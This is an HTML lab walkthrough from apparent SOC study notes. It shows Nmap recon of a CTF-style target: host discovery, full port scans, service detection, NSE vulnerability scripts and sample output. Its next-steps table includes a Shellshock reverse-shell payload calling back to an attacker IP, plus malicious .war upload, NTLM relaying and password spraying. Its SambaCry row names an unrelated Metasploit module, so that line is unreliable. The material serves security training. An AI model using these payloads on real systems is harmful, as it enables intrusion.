@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nmap Lab — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<nav class="navbar">
+  <button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()" title="Toggle sidebar" aria-label="Toggle sidebar">
+    <svg width="15" height="12" viewBox="0 0 15 12" fill="currentColor">
+      <rect width="15" height="2" rx="1"/>
+      <rect y="5" width="15" height="2" rx="1"/>
+      <rect y="10" width="15" height="2" rx="1"/>
+    </svg>
+  </button>
+  <a href="index.html" class="nav-brand"><span class="icon">⬡</span> SOC Notes</a>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside id="sb" class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-label">Nmap</div>
+      <div class="sidebar-title">Lab: Full Recon</div>
+    </div>
+  </aside>
+
+  <main id="main" class="main">
+    <div class="content-wrap">
+      <div id="content-area">
+        <div class="welcome">
+          <div class="w-icon">🧪</div>
+          <h2>Lab: Full Recon</h2>
+          <p>Select a topic from the sidebar to begin.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+window.NOTEBOOK = {
+  title: 'Lab: Full Recon',
+  topics: [
+    { id: 'scenario', badge: '00', label: 'Scenario & Setup'           },
+    { id: 'step1',    badge: '01', label: 'Step 1 — Host Discovery'    },
+    { id: 'step2',    badge: '02', label: 'Step 2 — Port Scan'         },
+    { id: 'step3',    badge: '03', label: 'Step 3 — Service Detection' },
+    { id: 'step4',    badge: '04', label: 'Step 4 — NSE Vuln Scan'    },
+    { id: 'step5',    badge: '05', label: 'Step 5 — OS & Aggressive'   },
+    { id: 'summary',  badge: '→',  label: 'Findings Summary'           },
+  ]
+};
+</script>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     EMBEDDED CONTENT TEMPLATES — no server required
+     ═══════════════════════════════════════════════════════════════ -->
+
+<template id="tpl-scenario">
+<article class="topic">
+<h1>00 · Scenario &amp; Setup</h1>
+<hr class="divider">
+
+<div class="callout lab"><strong>Lab Scenario</strong> — This walkthrough simulates a penetration testing engagement against a single target host. The goal is to map all open ports, identify running services and versions, and check for known vulnerabilities using NSE scripts. Follow each step in order.</div>
+
+<h2>Engagement Details</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Parameter</th><th>Value</th></tr></thead>
+  <tbody>
+    <tr><td>Target IP</td><td>10.10.10.5</td></tr>
+    <tr><td>Scope</td><td>Single host — all ports</td></tr>
+    <tr><td>Environment</td><td>HackTheBox-style CTF / pentest lab</td></tr>
+    <tr><td>Attacker IP</td><td>10.10.14.20 (your VM)</td></tr>
+    <tr><td>OS</td><td>Kali Linux / Parrot OS</td></tr>
+    <tr><td>Nmap version</td><td>7.94+</td></tr>
+    <tr><td>Permissions</td><td>Root — raw sockets available</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Recon Methodology</h2>
+<pre><code><span class="cm">Phase 1 — Host Discovery</span>
+  Confirm target is alive: ping, -sn, -Pn if needed
+
+<span class="cm">Phase 2 — Port Scan</span>
+  Find all open TCP ports: -sS -p- (fast, root)
+  Optional: UDP top ports for DNS/SNMP/TFTP exposure
+
+<span class="cm">Phase 3 — Service &amp; Version Detection</span>
+  -sV on discovered open ports only (faster)
+  Banner grab with --script=banner
+
+<span class="cm">Phase 4 — NSE Vulnerability Scan</span>
+  --script=vuln on all open ports
+  Targeted scripts for specific services (smb-vuln-ms17-010, etc.)
+
+<span class="cm">Phase 5 — OS Detection + Aggressive</span>
+  -O for TCP/IP fingerprint
+  -A for comprehensive single-host enumeration
+
+<span class="cm">Output: save all formats with -oA for documentation</span></code></pre>
+
+<h2>Output Directory Setup</h2>
+<pre><code><span class="cm"># Create organized output directory</span>
+mkdir -p ~/scans/10.10.10.5
+
+<span class="cm"># All scan files will be saved here</span>
+<span class="cm"># Convention: ~/scans/&lt;target-ip&gt;/&lt;phase&gt;</span>
+<span class="cm"># e.g. ~/scans/10.10.10.5/discovery.gnmap</span>
+<span class="cm">#      ~/scans/10.10.10.5/fullports.xml</span>
+<span class="cm">#      ~/scans/10.10.10.5/services.nmap</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-step1">
+<article class="topic">
+<h1>01 · Step 1 — Host Discovery</h1>
+<hr class="divider">
+
+<div class="callout note">Before spending time on a full port scan, confirm the target is reachable. A routed lab target may not respond to ICMP — use -Pn if all probes time out.</div>
+
+<h2>Command</h2>
+<pre><code><span class="cm"># Quick ping check (works if ICMP not blocked)</span>
+ping -c 3 10.10.10.5
+
+<span class="cm"># Nmap ping sweep (more thorough — uses ICMP + TCP probes)</span>
+sudo nmap -sn 10.10.10.5
+
+<span class="cm"># If ICMP is blocked, probe common ports</span>
+sudo nmap -sn -PS22,80,443,8080 10.10.10.5
+
+<span class="cm"># Last resort: skip discovery, assume host is up</span>
+sudo nmap -Pn 10.10.10.5</code></pre>
+
+<h2>Expected Output</h2>
+<pre><code>$ sudo nmap -sn 10.10.10.5
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-07 09:15 EDT
+
+Nmap scan report for 10.10.10.5
+Host is up (0.034s latency).
+MAC Address: 00:50:56:B0:12:34 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
+
+<span class="cm"># Host is up — confirmed. Latency 34ms suggests routed VPN connection.</span>
+<span class="cm"># VMware OUI = target is a VM (expected for lab).</span>
+<span class="cm"># Proceed to port scan.</span></code></pre>
+
+<h2>Interpretation</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Output</th><th>Meaning</th><th>Action</th></tr></thead>
+  <tbody>
+    <tr><td>Host is up (Xms latency)</td><td>Target responds to ping probes</td><td>Proceed to Step 2</td></tr>
+    <tr><td>"Host seems down"</td><td>All probes timed out — host may block ICMP</td><td>Re-run with -Pn</td></tr>
+    <tr><td>0 hosts up (0 hosts scanned)</td><td>Wrong target IP or routing issue</td><td>Check IP and routing</td></tr>
+  </tbody>
+</table>
+</div>
+</article>
+</template>
+
+<template id="tpl-step2">
+<article class="topic">
+<h1>02 · Step 2 — Full Port Scan</h1>
+<hr class="divider">
+
+<div class="callout note">Always scan all 65535 ports on a single target — services on non-standard ports are commonly missed by default top-1000 scans and are a major source of initial access in CTFs and real engagements.</div>
+
+<h2>Command</h2>
+<pre><code><span class="cm"># Full TCP port scan — SYN scan, all 65535 ports, save all formats</span>
+sudo nmap -sS -p- --open -T4 10.10.10.5 -oA ~/scans/10.10.10.5/fullports
+
+<span class="cm"># Breakdown:</span>
+<span class="cm"># -sS      = SYN scan (fast, requires root)</span>
+<span class="cm"># -p-      = scan all 65535 ports (not just top 1000)</span>
+<span class="cm"># --open   = only show open ports in output</span>
+<span class="cm"># -T4      = aggressive timing (lab network)</span>
+<span class="cm"># -oA      = save normal + XML + grepable output</span>
+
+<span class="cm"># Optional: add UDP top 20 for common services</span>
+sudo nmap -sU --top-ports 20 10.10.10.5 -oA ~/scans/10.10.10.5/udp_top20</code></pre>
+
+<h2>Expected Output</h2>
+<pre><code>$ sudo nmap -sS -p- --open -T4 10.10.10.5 -oA ~/scans/10.10.10.5/fullports
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-07 09:16 EDT
+Nmap scan report for 10.10.10.5
+Host is up (0.034s latency).
+Not shown: 65529 closed tcp ports (reset)
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8080/tcp open  http-proxy
+8443/tcp open  https-alt
+
+Nmap done: 1 IP address (1 host up) scanned in 89.43 seconds
+
+<span class="cm"># 6 open ports found:</span>
+<span class="cm"># 22   = SSH (likely Linux)</span>
+<span class="cm"># 80   = HTTP web server</span>
+<span class="cm"># 139  = NetBIOS (SMB stack — Windows or Samba)</span>
+<span class="cm"># 445  = SMB (major attack surface)</span>
+<span class="cm"># 8080 = HTTP alternate (Tomcat? Jenkins? Squid?)</span>
+<span class="cm"># 8443 = HTTPS alternate (admin panel? VPN?)</span></code></pre>
+
+<h2>Extract Port List for Next Step</h2>
+<pre><code><span class="cm"># Extract comma-separated port list from grepable output</span>
+grep "/open" ~/scans/10.10.10.5/fullports.gnmap | \
+  grep -oP '\d+/open' | \
+  awk -F/ '{printf "%s,", $1}' | \
+  sed 's/,$/\n/'
+
+<span class="cm"># Output: 22,80,139,445,8080,8443</span>
+<span class="cm"># Use this list in Step 3 with -p for targeted version detection</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-step3">
+<article class="topic">
+<h1>03 · Step 3 — Service &amp; Version Detection</h1>
+<hr class="divider">
+
+<div class="callout note">Run version detection only against known open ports — much faster than rescanning all 65535. Use the port list extracted from Step 2.</div>
+
+<h2>Command</h2>
+<pre><code><span class="cm"># Version detection + default scripts on open ports only</span>
+sudo nmap -sV -sC -p 22,80,139,445,8080,8443 10.10.10.5 \
+  -oA ~/scans/10.10.10.5/services
+
+<span class="cm"># Breakdown:</span>
+<span class="cm"># -sV   = service version detection (intensity 7)</span>
+<span class="cm"># -sC   = run default NSE scripts</span>
+<span class="cm"># -p    = only scan the ports found in Step 2</span>
+
+<span class="cm"># Also grab banners explicitly</span>
+nmap --script=banner -p 22,80,8080,8443 10.10.10.5</code></pre>
+
+<h2>Expected Output</h2>
+<pre><code>$ sudo nmap -sV -sC -p 22,80,139,445,8080,8443 10.10.10.5
+
+Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-07 09:22 EDT
+Nmap scan report for 10.10.10.5
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:7e:aa:30:2e:b9:98:ee:2b:9d:0b:c9:0c:d6:e4:1f (ECDSA)
+|_  256 4c:d0:3e:27:2f:73:b2:25:9d:da:16:a9:ca:cd:7c:a1 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: lame
+|   NetBIOS computer name: LAME\x00
+|   Domain name: hack.local
+|   FQDN: lame.hack.local
+|_  System time: 2024-03-07T09:22:14-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|_  message_signing: disabled        ← SMB signing disabled!
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/5.5
+|_http-server-header: Apache-Coyote/1.1
+8443/tcp open  ssl/http    Apache Tomcat/Coyote JSP engine 1.1
+| ssl-cert: Subject: commonName=lame/organizationName=SomeOrganization
+| Not valid after: 2025-03-07
+
+<span class="cm"># Key findings:</span>
+<span class="cm"># OpenSSH 7.2p2 → old version, check for CVEs</span>
+<span class="cm"># Apache 2.4.18 → old version, check for CVEs</span>
+<span class="cm"># Samba 4.3.11  → old version (likely SambaCry vulnerable)</span>
+<span class="cm"># Tomcat 5.5    → end-of-life, many known CVEs</span>
+<span class="cm"># SMB signing disabled → relay attacks possible</span></code></pre>
+
+<h2>Notable Service Versions Found</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Risk</th></tr></thead>
+  <tbody>
+    <tr><td>22</td><td>OpenSSH</td><td>7.2p2</td><td>Username enumeration CVE-2016-6210</td></tr>
+    <tr><td>80</td><td>Apache HTTP</td><td>2.4.18</td><td>Multiple CVEs; outdated</td></tr>
+    <tr><td>139/445</td><td>Samba</td><td>4.3.11</td><td>SambaCry CVE-2017-7494 — RCE</td></tr>
+    <tr><td>8080</td><td>Apache Tomcat</td><td>5.5</td><td>End-of-life; multiple critical CVEs</td></tr>
+    <tr><td>8443</td><td>Tomcat SSL</td><td>5.5</td><td>Same as 8080</td></tr>
+  </tbody>
+</table>
+</div>
+</article>
+</template>
+
+<template id="tpl-step4">
+<article class="topic">
+<h1>04 · Step 4 — NSE Vulnerability Scan</h1>
+<hr class="divider">
+
+<div class="callout warn"><strong>Vuln scripts may trigger IDS alerts</strong> and generate unusual traffic. In a production assessment, coordinate timing with the client's SOC team.</div>
+
+<h2>Commands</h2>
+<pre><code><span class="cm"># Run full vuln category on open ports</span>
+sudo nmap --script=vuln -p 22,80,139,445,8080,8443 10.10.10.5 \
+  -oA ~/scans/10.10.10.5/vulnscan
+
+<span class="cm"># Targeted: check EternalBlue on SMB</span>
+sudo nmap --script=smb-vuln-ms17-010 -p 445 10.10.10.5
+
+<span class="cm"># Targeted: check SambaCry</span>
+sudo nmap --script=smb-vuln-cve-2017-7494 -p 445 10.10.10.5
+
+<span class="cm"># Targeted: check Shellshock on HTTP CGI</span>
+sudo nmap --script=http-shellshock \
+  --script-args uri=/cgi-bin/status.cgi -p 80 10.10.10.5
+
+<span class="cm"># Check SMB shares (accessible without credentials?)</span>
+sudo nmap --script=smb-enum-shares,smb-enum-users -p 445 10.10.10.5</code></pre>
+
+<h2>Expected NSE Output — SMB</h2>
+<pre><code>$ sudo nmap --script=smb-vuln-cve-2017-7494,smb-enum-shares \
+  -p 139,445 10.10.10.5
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-cve-2017-7494:
+|   VULNERABLE:
+|   Samba RCE from client in directory writable by the Samba process.
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2017-7494
+|     Risk factor: HIGH
+|     Description:
+|       Samba since version 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14
+|       is vulnerable to remote code execution vulnerability, allowing
+|       a malicious client to upload a shared library to a writable share,
+|       and then cause the server to load and execute it.
+|     References:
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7494
+
+| smb-enum-shares:
+|   account_used: &lt;blank&gt;
+|   \\10.10.10.5\IPC$:
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (lame server (Samba 4.3.11-Ubuntu))
+|     Access: READ WRITE    ← writable IPC share!
+|   \\10.10.10.5\tmp:
+|     Type: STYPE_DISKTREE
+|     Comment: oh noes!
+|_    Access: READ WRITE    ← writable share — attack vector for SambaCry!</code></pre>
+
+<h2>Expected NSE Output — HTTP</h2>
+<pre><code>$ sudo nmap --script=http-vuln-cve2017-5638,http-shellshock \
+  --script-args uri=/cgi-bin/status.cgi -p 80 10.10.10.5
+
+PORT   STATE SERVICE
+80/tcp open  http
+
+| http-shellshock:
+|   VULNERABLE:
+|   HTTP Shellshock vulnerability
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2014-6271
+|     Path: /cgi-bin/status.cgi
+|     Disclosure date: 2014-09-24
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271</code></pre>
+
+<h2>SMB Enumeration Output</h2>
+<pre><code>$ sudo nmap --script=smb-enum-users -p 445 10.10.10.5
+
+| smb-enum-users:
+|   LAME\backup (RID: 1068)
+|   LAME\bin (RID: 1004)
+|   LAME\daemon (RID: 1002)
+|   LAME\games (RID: 1010)
+|   LAME\makis (RID: 3004)     ← non-standard user — investigate
+|   LAME\msfadmin (RID: 3000)  ← admin account name leaked
+|   LAME\nobody (RID: 65534)
+|   LAME\root (RID: 1000)
+
+<span class="cm"># msfadmin and makis are unusual — target accounts for further testing</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-step5">
+<article class="topic">
+<h1>05 · Step 5 — OS Detection &amp; Aggressive Scan</h1>
+<hr class="divider">
+
+<h2>OS Detection</h2>
+<pre><code><span class="cm"># OS fingerprinting — requires 1 open + 1 closed port</span>
+sudo nmap -O 10.10.10.5
+
+<span class="cm"># Combined with aggressive guess</span>
+sudo nmap -O --osscan-guess 10.10.10.5</code></pre>
+
+<h2>OS Detection Output</h2>
+<pre><code>$ sudo nmap -O 10.10.10.5
+
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+8080/tcp open   http-proxy
+8443/tcp open   https-alt
+
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.24 - 2.6.28
+Network Distance: 1 hop
+
+<span class="cm"># Linux 2.6.24-2.6.28 = Ubuntu 8.04 - 9.10 (very old!)</span>
+<span class="cm"># Confirms this is a vulnerable/legacy system</span></code></pre>
+
+<h2>Aggressive Scan</h2>
+<pre><code><span class="cm"># Full aggressive scan — version + default scripts + OS + traceroute</span>
+sudo nmap -A -p 22,80,139,445,8080,8443 10.10.10.5 \
+  -oA ~/scans/10.10.10.5/aggressive
+
+<span class="cm"># Add vuln scripts for comprehensive single-command enumeration</span>
+sudo nmap -A --script=vuln -p 22,80,139,445,8080,8443 10.10.10.5</code></pre>
+
+<h2>Aggressive Scan Output (excerpt)</h2>
+<pre><code>$ sudo nmap -A -p 22,80,139,445,8080,8443 10.10.10.5
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+| ssh-hostkey:
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-robots.txt: 1 disallowed entry
+|_/joomla/                  ← hidden Joomla CMS path found!
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache Tomcat/5.5
+| http-methods:
+|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS  ← PUT &amp; DELETE enabled!
+
+OS details: Linux 2.6.24 - 2.6.28
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   33.72 ms 10.10.14.1
+2   34.18 ms 10.10.10.5
+
+<span class="cm"># NEW findings from default scripts:</span>
+<span class="cm"># robots.txt reveals /joomla/ → check for default credentials, Joomla CVEs</span>
+<span class="cm"># Tomcat allows PUT and DELETE methods → file upload / WebDAV risk</span>
+<span class="cm"># OS is ancient Linux 2.6.x → kernel exploit candidates</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-summary">
+<article class="topic">
+<h1>→ · Findings Summary</h1>
+<hr class="divider">
+
+<div class="callout lab"><strong>Engagement Complete</strong> — All five recon phases completed. Below is the consolidated findings table and recommended next steps.</div>
+
+<h2>Open Ports &amp; Services</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Port</th><th>Service</th><th>Version</th><th>State</th></tr></thead>
+  <tbody>
+    <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu</td><td>open</td></tr>
+    <tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.18</td><td>open</td></tr>
+    <tr><td>139/tcp</td><td>NetBIOS</td><td>Samba smbd 3.X-4.X</td><td>open</td></tr>
+    <tr><td>445/tcp</td><td>SMB</td><td>Samba 4.3.11-Ubuntu</td><td>open</td></tr>
+    <tr><td>8080/tcp</td><td>HTTP</td><td>Apache Tomcat 5.5</td><td>open</td></tr>
+    <tr><td>8443/tcp</td><td>HTTPS</td><td>Apache Tomcat 5.5 (SSL)</td><td>open</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Vulnerabilities Found</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>CVE</th><th>Service</th><th>Description</th><th>Risk</th></tr></thead>
+  <tbody>
+    <tr><td>CVE-2017-7494</td><td>Samba 4.3.11 (445)</td><td>SambaCry — RCE via malicious shared library uploaded to writable share</td><td>Critical</td></tr>
+    <tr><td>CVE-2014-6271</td><td>Apache CGI (80)</td><td>Shellshock — RCE via crafted HTTP headers to CGI scripts</td><td>Critical</td></tr>
+    <tr><td>CVE-2016-6210</td><td>OpenSSH 7.2p2 (22)</td><td>Username enumeration via timing side-channel</td><td>Medium</td></tr>
+    <tr><td>N/A</td><td>Tomcat 5.5 (8080/8443)</td><td>End-of-life — multiple critical unpatched CVEs; PUT/DELETE methods enabled</td><td>Critical</td></tr>
+    <tr><td>N/A</td><td>SMB (445)</td><td>SMB signing disabled — NTLM relay attacks possible</td><td>High</td></tr>
+    <tr><td>N/A</td><td>SMB (445)</td><td>Writable \\tmp share accessible without credentials</td><td>High</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Full Nmap Command Sequence (Reference)</h2>
+<pre><code><span class="cm"># Step 1 — Host discovery</span>
+sudo nmap -sn 10.10.10.5
+
+<span class="cm"># Step 2 — Full port scan, all TCP</span>
+sudo nmap -sS -p- --open -T4 10.10.10.5 -oA ~/scans/10.10.10.5/fullports
+
+<span class="cm"># Step 3 — Service &amp; version detection on open ports</span>
+sudo nmap -sV -sC -p 22,80,139,445,8080,8443 10.10.10.5 \
+  -oA ~/scans/10.10.10.5/services
+
+<span class="cm"># Step 4 — NSE vulnerability scan</span>
+sudo nmap --script=vuln -p 22,80,139,445,8080,8443 10.10.10.5 \
+  -oA ~/scans/10.10.10.5/vulnscan
+
+<span class="cm"># Targeted SMB checks</span>
+sudo nmap --script=smb-vuln-cve-2017-7494,smb-enum-shares,smb-enum-users \
+  -p 139,445 10.10.10.5
+
+<span class="cm"># Targeted HTTP Shellshock</span>
+sudo nmap --script=http-shellshock \
+  --script-args uri=/cgi-bin/status.cgi -p 80 10.10.10.5
+
+<span class="cm"># Step 5 — OS detection + aggressive</span>
+sudo nmap -A -p 22,80,139,445,8080,8443 10.10.10.5 \
+  -oA ~/scans/10.10.10.5/aggressive</code></pre>
+
+<h2>Recommended Next Steps</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Priority</th><th>Finding</th><th>Next Action</th></tr></thead>
+  <tbody>
+    <tr><td>1 — Critical</td><td>SambaCry (CVE-2017-7494) — writable /tmp share</td><td>Exploit with Metasploit: exploit/multi/samba/usermap_script or manual payload upload</td></tr>
+    <tr><td>2 — Critical</td><td>Shellshock on /cgi-bin/status.cgi</td><td>Craft User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.20/4444 0&gt;&amp;1</td></tr>
+    <tr><td>3 — Critical</td><td>Tomcat 5.5 with PUT/DELETE</td><td>Upload .war file via PUT — deploy malicious servlet for RCE</td></tr>
+    <tr><td>4 — High</td><td>Joomla at /joomla/ (found in robots.txt)</td><td>Check Joomla version with /joomla/administrator; try default admin:admin</td></tr>
+    <tr><td>5 — High</td><td>SMB signing disabled</td><td>Run Responder + ntlmrelayx to relay credentials; wait for incoming auth</td></tr>
+    <tr><td>6 — Medium</td><td>Enumerated users via SMB</td><td>Password spray msfadmin and makis accounts against SSH (port 22)</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>ndiff Change Detection (Baseline)</h2>
+<pre><code><span class="cm"># Save this scan as baseline for future comparisons</span>
+cp ~/scans/10.10.10.5/services.xml ~/scans/baselines/10.10.10.5_$(date +%Y%m%d).xml
+
+<span class="cm"># Future scan comparison</span>
+sudo nmap -sV -p 22,80,139,445,8080,8443 10.10.10.5 \
+  -oX ~/scans/10.10.10.5/rescan.xml
+
+ndiff ~/scans/baselines/10.10.10.5_20240307.xml \
+      ~/scans/10.10.10.5/rescan.xml
+
+<span class="cm"># ndiff will highlight any new ports, changed versions, or new hosts</span></code></pre>
+</article>
+</template>
+
+<script src="js/app.js"></script>
+</body>
+</html>
